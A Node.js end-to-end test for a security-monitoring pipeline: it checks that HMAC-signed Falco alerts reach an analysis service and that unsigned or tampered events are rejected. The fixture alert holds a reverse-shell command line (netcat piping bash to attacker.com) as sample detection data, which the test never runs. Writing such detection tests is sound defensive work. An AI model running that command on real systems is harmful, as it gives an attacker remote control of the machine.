#!/usr/bin/env node
import { spawn } from "node:child_process";
import { createHmac, timingSafeEqual } from "node:crypto";
import http from "node:http";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const root = join(__dirname, "..");
const ANALYSIS_BIN = join(root, "bin", "analysis");

const ANALYSIS_PORT = 18182;
const WEBHOOK_PORT = 28182;
const SIGNER_PORT = 28183;
const SHARED_SECRET = "test-secret-kernelharbor-2026";

function verifyHmac(body, sig, secret) {
  if (!sig) return false;
  const expected = createHmac("sha256", secret).update(body).digest();
  const actual = Buffer.from(sig, "hex");
  if (expected.length !== actual.length) return false;
  return timingSafeEqual(expected, actual);
}

function waitForPort(host, port, timeoutMs = 10000) {
  const start = Date.now();
  return new Promise((resolve) => {
    function check() {
      const sock = new http.Agent().createConnection({ host, port }, () => {
        sock.destroy();
        resolve(true);
      });
      sock.on("error", () => {
        sock.destroy();
        if (Date.now() - start > timeoutMs) resolve(false);
        else setTimeout(check, 200);
      });
    }
    check();
  });
}

function httpPost(url, body, extraHeaders = {}) {
  return new Promise((resolve) => {
    const headers = { "Content-Type": "application/json", ...extraHeaders };
    const req = http.request(url, { method: "POST", headers }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => resolve({ status: res.statusCode, body: data }));
    });
    req.on("error", (err) => resolve({ status: 0, error: err.message }));
    req.write(JSON.stringify(body));
    req.end();
  });
}

function httpGet(url) {
  return new Promise((resolve) => {
    http.get(url, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch { resolve({ status: res.statusCode, body: data }); }
      });
    }).on("error", (err) => resolve({ status: 0, error: err.message }));
  });
}

function fakeFalcoEvent() {
  return {
    hostname: "e2e-hmac-test",
    rule: "Reverse Shell Detection",
    priority: "Critical",
    time: new Date().toISOString(),
    tags: ["kernelharbor", "mitre_execution"],
    output: "Reverse shell detected via HMAC pipeline",
    output_fields: {
      "evt.type": "execve",
      "proc.cmdline": "nc -e /bin/bash attacker.com 4444",
      "proc.exe": "/usr/bin/nc",
      "proc.pid": 7777,
      "proc.ppid": 1,
      "user.name": "root",
    },
  };
}

let passed = 0, failed = 0;
function ok(msg) { console.log(`  ✓ ${msg}`); passed++; }
function nok(msg) { console.log(`  ✗ ${msg}`); failed++; }

async function run() {
  console.log("KernelHarbor — Full HMAC Pipeline E2E Test");
  console.log("===========================================\n");
  console.log(`Secret: "${SHARED_SECRET}"`);

  let analysisProc, webhookSrv;

  try {
    // ===== 1. Start analysis =====
    console.log("\n1. Starting analysis on :" + ANALYSIS_PORT + "...");
    analysisProc = spawn(ANALYSIS_BIN, [], {
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        HTTP_ADDRESS: `127.0.0.1:${ANALYSIS_PORT}`,
        GRPC_ADDRESS: `127.0.0.1:${ANALYSIS_PORT + 1000}`,
        PROTOCOL: "http",
        LLM_BACKEND: "none",
      },
    });
    analysisProc.stdout.on("data", () => {});
    analysisProc.stderr.on("data", () => {});

    const analysisReady = await waitForPort("127.0.0.1", ANALYSIS_PORT);
    if (!analysisReady) { console.log("  ✗ Failed to start"); process.exit(1); }
    ok("Analysis server started");

    // ===== 2. Start HMAC-verifying webhook =====
    console.log("\n2. Starting HMAC webhook on :" + WEBHOOK_PORT + "...");
    let receivedEvents = [];

    webhookSrv = http.createServer((req, res) => {
      if (req.method !== "POST" || req.url !== "/falco/event") {
        res.writeHead(404); return res.end();
      }

      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", () => {
        // HMAC verification (same logic as plugin.mjs)
        const sig = req.headers["x-kh-signature-256"];
        if (!sig || !verifyHmac(body, sig, SHARED_SECRET)) {
          res.writeHead(401, { "Content-Type": "application/json" });
          return res.end(JSON.stringify({ error: "invalid hmac signature" }));
        }

        try {
          const fe = JSON.parse(body);
          if (fe.tags && fe.tags.includes("kernelharbor")) {
            const of = fe.output_fields || {};
            const event = {
              "@timestamp": fe.time,
              "host.name": fe.hostname || "unknown",
              "event.type": of["evt.type"] || "execve",
              "command.line": of["proc.cmdline"] || "",
              "image.path": of["proc.exe"] || "",
              "process.pid": parseInt(of["proc.pid"]) || 0,
              "user.name": of["user.name"] || "",
              metadata: { falco_rule: fe.rule || "" },
            };
            receivedEvents.push(event);
            // Forward to analysis
            httpPost(`http://127.0.0.1:${ANALYSIS_PORT}/ingest`, event).catch(() => {});
          }
        } catch {}
        res.writeHead(200);
        res.end(JSON.stringify({ status: "ok" }));
      });
    });
    webhookSrv.listen(WEBHOOK_PORT);
    ok("HMAC webhook started");

    // ===== 3. Start the HMAC signer =====
    console.log("\n3. Starting HMAC signer on :" + SIGNER_PORT + "...");
    const signerProc = spawn(process.execPath, [join(root, "signer.mjs")], {
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        KH_SIGNING_SECRET: SHARED_SECRET,
        KH_SIGNER_PORT: String(SIGNER_PORT),
        KH_WEBHOOK_TARGET: `http://127.0.0.1:${WEBHOOK_PORT}/falco/event`,
      },
    });
    signerProc.stdout.on("data", () => {});
    signerProc.stderr.on("data", () => {});

    const signerReady = await waitForPort("127.0.0.1", SIGNER_PORT);
    if (!signerReady) { console.log("  ✗ Signer failed to start"); process.exit(1); }
    ok("HMAC signer started");

    // ===== 4. Test: Send via signer =====
    console.log("\n4. Sending event THROUGH signer (port " + SIGNER_PORT + ")...");
    const event = fakeFalcoEvent();
    const viaSigner = await httpPost(`http://127.0.0.1:${SIGNER_PORT}/falco/event`, event);

    if (viaSigner.status === 200) ok("Signer accepted and forwarded (HTTP 200)");
    else { nok("Signer returned " + viaSigner.status); }

    await new Promise((r) => setTimeout(r, 1500));

    // ===== 5. Test: Send directly to webhook (should be REJECTED) =====
    console.log("\n5. Sending event DIRECTLY to webhook (should be rejected)...");
    const directToWebhook = await httpPost(`http://127.0.0.1:${WEBHOOK_PORT}/falco/event`, event);
    if (directToWebhook.status === 401) ok("Webhook correctly rejected direct event (no HMAC)");
    else nok("Webhook should have returned 401, got " + directToWebhook.status);

    // ===== 6. Verify alert reached analysis =====
    console.log("\n6. Verifying alert reached analysis...");
    const alertsRes = await httpGet(`http://127.0.0.1:${ANALYSIS_PORT}/api/alerts?since=1h&min_verdict=benign&limit=10`);
    if (alertsRes.status === 200) {
      ok("GET /api/alerts returned 200");
      const alerts = alertsRes.body.alerts || [];
      const matches = alerts.filter((a) => a["host.name"] === "e2e-hmac-test");
      if (matches.length > 0) {
        ok(`Alert matched (${matches.length} alerts from e2e-hmac-test)`);
        console.log(`     rule: ${matches[0].metadata?.falco_rule || "N/A"}`);
      } else {
        nok("No alert matched — pipeline may not be working");
      }
    } else {
      nok("GET /api/alerts failed: " + alertsRes.status);
    }

    // ===== 7. Test: Tampered event directly to webhook =====
    console.log("\n7. Sending event directly to webhook with WRONG HMAC...");
    const tamperedEvent = fakeFalcoEvent();
    tamperedEvent.hostname = "tampered-host";
    const tamperedSig = "0000000000000000000000000000000000000000000000000000000000000000";
    const tampered = await httpPost(
      `http://127.0.0.1:${WEBHOOK_PORT}/falco/event`,
      tamperedEvent,
      { "X-KH-Signature-256": tamperedSig }
    );
    if (tampered.status === 401) ok("Webhook rejected tampered HMAC (401)");
    else nok("Expected 401 for tampered HMAC, got " + tampered.status);

    // Cleanup
    signerProc.kill("SIGTERM");
    await new Promise(r => setTimeout(r, 300));
    try { signerProc.kill("SIGKILL"); } catch {}

  } finally {
    if (analysisProc) { analysisProc.kill("SIGTERM"); await new Promise(r => setTimeout(r, 500)); try { analysisProc.kill("SIGKILL"); } catch {} }
    if (webhookSrv) { try { webhookSrv.close(); } catch {} }
  }

  const total = passed + failed;
  console.log(`\n===========================================`);
  console.log(`HMAC Pipeline: ${passed}/${total} passed, ${failed}/${total} failed`);
  process.exit(failed > 0 ? 1 : 0);
}

run().catch((e) => { console.error("Fatal:", e); process.exit(1); });
